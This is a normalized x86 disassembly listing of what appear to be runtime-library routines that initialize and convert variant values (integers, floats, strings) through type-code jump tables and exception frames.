mov edx [ ebx ]
call sub_404140
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407d94
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404710
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404140
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407d58
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404710
jmp r-xdata
jmp r-xdata
call sub_40e868
sub_412168
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412227
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412205
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ec60
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4046d4
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c0
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404140
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41220c
lea eax [ ebp - 0x10 ]
call sub_40f004
retn
sub_412234
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41228a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f32c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_41231c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412291
lea eax [ ebp - 0x10 ]
call sub_40f004
retn
sub_412298
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_414518
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41230d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403f0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f004
retn
sub_41231c
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412853
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412355 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f0c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403eb8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4080a8
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403f0c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4080a8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403f0c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409674
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f0c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409674
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403f0c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_412034
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404140
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_41206c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404140
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4046d4
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c0
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404140
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_4120a4
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404140
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_4080a8
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403f0c
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4080a8
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403f0c
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_4080a8
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403f0c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_408194
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403f0c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_408194
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403f0c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_41231c
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412168
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403f0c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41285a
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403edc
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4045dc
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403edc
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4045dc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403edc
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_412234
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403f0c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403f0c
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e7cc
test ah 0x40
je r-xdata
mov eax esi
call sub_403eb8
mov edx eax
mov eax ebx
call sub_412298
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_412168
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403f0c
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412168
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403f0c
jmp r-xdata
jmp [ eax * 4 + jump_table_4125e9 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4080a8
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403f0c
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4080a8
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403f0c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409674
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403f0c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409674
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403f0c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_412034
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404140
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_41206c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404140
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4040e0
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_4120a4
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404140
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4080a8
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403f0c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4080a8
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403f0c
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4080a8
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403f0c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_408194
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403f0c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_408194
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403f0c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_41231c
jmp r-xdata
sub_412860
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41290a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4128ed
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ec60
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4046d4
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4128f4
lea eax [ ebp - 0x10 ]
call sub_40f004
retn
sub_412918
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41296e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f32c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412975
lea eax [ ebp - 0x10 ]
call sub_40f004
retn
sub_41297c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412a34
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_414518
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412a3b
lea eax [ ebp - 0x20 ]
call sub_4045c4
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412a17
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4046d4
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f004
retn
sub_412a44
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412f96
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412a7e ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404710
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4045c4
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4080a8
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404710
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4080a8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404710
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409674
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404710
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409674
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404710
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_412034
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404600
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_41206c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404600
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4046d4
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c0
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_4120a4
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404600
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_4080a8
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404710
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4080a8
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404710
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_4080a8
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404710
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408194
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404710
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_408194
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404710
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412a44
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412860
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404600
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f9d
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4045dc
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403edc
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4045dc
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403edc
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4045dc
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403edc
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4045dc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403edc
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412918
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404600
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404710
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e7cc
test ah 0x40
je r-xdata
mov eax esi
call sub_4045c4
mov edx eax
mov eax ebx
call sub_41297c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412860
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404600
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_412860
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404600
jmp r-xdata
jmp [ eax * 4 + jump_table_412d05 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4080a8
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404710
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4080a8
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404710
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409674
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404710
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409674
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404710
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_412034
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404600
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_41206c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404600
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4046d4
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_4120a4
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404600
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4080a8
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404710
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4080a8
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404710
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4080a8
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404710
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_408194
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404710
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_408194
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404710
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412a44
jmp r-xdata
sub_412fa4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41300e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f32c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4057cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413015
lea eax [ ebp - 0x10 ]
call sub_40f004
retn
mov dx 0xd
mov ax 0x101
call sub_40e7cc
sub_41301c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_412fa4
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4057cc
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4057cc
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_4057b4
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_414518
test al al
je r-xdata
mov eax esi
call sub_4057b4
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e7cc
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e7cc
mov eax esi
call sub_4057b4
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4031dc
test al al
jne r-xdata
sub_4130e8
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_4057b4
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_4057b4
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e7cc
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4057cc
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4057cc
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_414518
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e7cc
mov eax esi
call sub_4057b4
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4031dc
test al al
jne r-xdata
sub_413194
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40ef88
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_4131d0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ef88
sub_4131f0
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ef88
sub_413210
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ef88
sub_413230
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ef88
sub_413250
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ef88
sub_413270
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ef88
sub_413290
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ef88
sub_4132bc
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40ef88
sub_4132e0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ef88
sub_41330c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ef88
sub_413338
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ef88
sub_413364
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40ef88
sub_4133c8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f0c
pop esi
pop ebx
retn
mov eax ebx
call sub_40ef88
sub_4133f4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4047c0
pop esi
pop ebx
retn
mov eax ebx
call sub_40ef88
sub_41342c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4057cc
pop esi
pop ebx
retn
mov eax ebx
call sub_40ef88
sub_413458
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4057cc
pop esi
pop ebx
retn
mov eax ebx
call sub_40ef88
sub_413484
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40e868
mov bx 0x8
jmp r-xdata
sub_4134a8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41356b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40f32c
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413d5c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413572
lea eax [ ebp - 0x11 ]
